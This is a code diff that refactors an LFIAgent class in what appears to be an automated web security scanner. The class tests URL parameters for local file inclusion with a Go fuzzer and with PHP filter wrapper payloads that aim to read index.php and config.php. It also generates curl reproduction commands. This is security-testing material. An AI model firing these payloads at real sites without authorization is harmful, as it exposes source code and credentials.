@@ -75,75 +75,84 @@ class LFIAgent(BaseAgent):
             logger.debug(f"_get_response_text failed: {e}")
             return ""
         
+    def _create_lfi_finding_from_hit(self, hit: Dict, param: str) -> Dict:
+        """Create LFI finding from fuzzer hit."""
+        return {
+            "type": "LFI / Path Traversal",
+            "url": self.url,
+            "parameter": param,
+            "payload": hit["payload"],
+            "description": f"Local File Inclusion success: Found {hit['file_found']}. File content leaked in response.",
+            "severity": hit["severity"],
+            "validated": True,
+            "status": "VALIDATED_CONFIRMED",
+            "evidence": hit["evidence"],
+            "reproduction": f"curl '{self.url}?{param}={hit['payload']}'"
+        }
+
+    def _create_lfi_finding_from_wrapper(self, payload: str, param: str, response_text: str) -> Dict:
+        """Create LFI finding from PHP wrapper test."""
+        return {
+            "type": "LFI / Path Traversal",
+            "url": self.url,
+            "parameter": param,
+            "payload": payload,
+            "description": f"LFI detected via PHP wrapper. Source code can be read using base64 encoding filter.",
+            "severity": "CRITICAL",
+            "validated": True,
+            "evidence": f"PHP Wrapper matched signature after injecting {payload}",
+            "status": self._determine_validation_status(response_text, payload),
+            "reproduction": f"curl '{self.url}?{param}={payload}' | base64 -d"
+        }
+
+    async def _test_php_wrappers(self, session, param: str) -> Optional[Dict]:
+        """Test PHP wrapper payloads as fallback."""
+        base_payloads = [
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://filter/convert.base64-encode/resource=config.php"
+        ]
+
+        for p in base_payloads:
+            dashboard.update_task(f"LFI:{param}", status=f"Testing Wrapper {p[:20]}...")
+            if await self._test_payload(session, p, param):
+                response_text = await self._get_response_text(session, p, param)
+                return self._create_lfi_finding_from_wrapper(p, param, response_text)
+        return None
+
     async def run_loop(self) -> Dict:
         """Main execution loop for LFI testing."""
         dashboard.current_agent = self.name
         dashboard.log(f"[{self.name}] 🚀 Starting LFI analysis on {self.url}", "INFO")
-        
+
         all_findings = []
-        
         async with aiohttp.ClientSession() as session:
             for param in self.params:
                 logger.info(f"[{self.name}] Testing LFI on {self.url} (param: {param})")
-                
-                # Deduplication check
+
                 key = f"{self.url}#{param}"
                 if key in self._tested_params:
                     logger.info(f"[{self.name}] Skipping {param} - already tested")
                     continue
-                
-                # 1. High-Performance Go Fuzzer
+
+                # High-Performance Go Fuzzer
                 dashboard.log(f"[{self.name}] 🚀 Launching Go LFI Fuzzer on '{param}'...", "INFO")
                 go_result = await external_tools.run_go_lfi_fuzzer(self.url, param)
-                
+
                 if go_result and go_result.get("hits"):
                     for hit in go_result["hits"]:
                         dashboard.log(f"[{self.name}] 🚨 LFI HIT: {hit['payload']} ({hit['severity']})", "CRITICAL")
-                        all_findings.append({
-                            "type": "LFI / Path Traversal",
-                            "url": self.url,
-                            "parameter": param,
-                            "payload": hit["payload"],
-                            "description": f"Local File Inclusion success: Found {hit['file_found']}. File content leaked in response.",
-                            "severity": hit["severity"],
-                            "validated": True,
-                            "status": "VALIDATED_CONFIRMED",
-                            "evidence": hit["evidence"],
-                            "reproduction": f"curl '{self.url}?{param}={hit['payload']}'"
-                        })
+                        all_findings.append(self._create_lfi_finding_from_hit(hit, param))
                         self._tested_params.add(key)
-                        break # Found one for this param, move count
-                
-                # 2. Base Payloads (Manual Fallback if Go fails or for PHP wrappers)
+                        break
+
+                # Base Payloads (Manual Fallback if Go fails or for PHP wrappers)
                 if key not in self._tested_params:
-                    base_payloads = [
-                        "php://filter/convert.base64-encode/resource=index.php",
-                        "php://filter/convert.base64-encode/resource=config.php"
-                    ]
-            
-                    for p in base_payloads:
-                        dashboard.update_task(f"LFI:{param}", status=f"Testing Wrapper {p[:20]}...")
-                        if await self._test_payload(session, p, param):
-                            response_text = await self._get_response_text(session, p, param)
-                            all_findings.append({
-                                "type": "LFI / Path Traversal",
-                                "url": self.url,
-                                "parameter": param,
-                                "payload": p,
-                                "description": f"LFI detected via PHP wrapper. Source code can be read using base64 encoding filter.",
-                                "severity": "CRITICAL",
-                                "validated": True,
-                                "evidence": f"PHP Wrapper matched signature after injecting {p}",
-                                "status": self._determine_validation_status(response_text, p),
-                                "reproduction": f"curl '{self.url}?{param}={p}' | base64 -d"
-                            })
-                            self._tested_params.add(key)
-                            break
-                
-        return {
-            "vulnerable": len(all_findings) > 0,
-            "findings": all_findings
-        }
+                    wrapper_finding = await self._test_php_wrappers(session, param)
+                    if wrapper_finding:
+                        all_findings.append(wrapper_finding)
+                        self._tested_params.add(key)
+
+        return {"vulnerable": len(all_findings) > 0, "findings": all_findings}
 
     async def _test_payload(self, session, payload, param) -> bool:
         """Injects payload and analyzes response."""
